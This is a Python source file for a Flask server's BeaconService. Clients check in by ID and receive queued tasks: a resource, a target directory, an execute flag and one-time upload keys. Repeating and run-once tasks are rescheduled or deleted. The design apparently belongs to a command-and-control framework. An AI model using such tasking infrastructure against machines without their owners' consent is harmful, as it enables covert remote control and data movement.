from server import db
from server.models import Task, User
from datetime import datetime, timedelta
from sqlalchemy import or_
from flask import send_file
from server.task_modes import TaskMode
import os
import uuid
from server.logger import Logger, LogLevel

class BeaconService():
    one_time_keys = {}
    
    def __init__(self):
        pass
    
    def handle_beacon_request(self, client_id):
        user = User.query.filter_by(client_id=client_id).first()
        
        if user:
            user.last_beacon_signal = datetime.utcnow()
            print(f"[+] Updated last_beacon_signal for client_id: {client_id}") # Debugging purposes
            db.session.commit()
            Logger.log(client_id, LogLevel.INFO.value, "Client beacon recieved")
        else:
            # TODO: Implement emergency mechanism when client_id not found in User table
            print(f"[!] Client ID: {client_id} not found in User table.") # Debugging purposes
            Logger.log(client_id, LogLevel.ERROR.value, "Client id not found in database")
            return {}
            
        tasks = Task.query.filter(
            Task.client_id == client_id,
            or_(Task.next_execution == None, Task.next_execution <= datetime.utcnow())
        ).all()
        
        task_commands = []
        
        for task in tasks:
            one_time_key = None
            
            if task.command_mode == TaskMode.FILE_UPLOAD.value:
                one_time_key = str(uuid.uuid4())
                self.one_time_keys[client_id] = one_time_key

            task_dict = {
                "mode": task.command_mode,
                "resource": task.command,
                "target_dir": task.target_path,
                "execute": task.execute,
                "fup_key": one_time_key
            }

            task_commands.append(task_dict)
            
            if task.repeat_interval:
                task.next_execution = datetime.utcnow() + timedelta(seconds=task.repeat_interval)
            
            if task.run_once:
                db.session.delete(task)
                Logger.log(client_id, LogLevel.INFO.value, f"Discarding run-once task: {task_dict}")
            else:
                db.session.add(task)
            
            Logger.log(client_id, LogLevel.INFO.value, f"Invoking task: {task_dict}")
        
        db.session.commit()

        return task_commands
    
    @classmethod
    def verify_otk(cls, client_id, key):
        if client_id in cls.one_time_keys and cls.one_time_keys[client_id] == key:
            del cls.one_time_keys[client_id]
            return True
        return False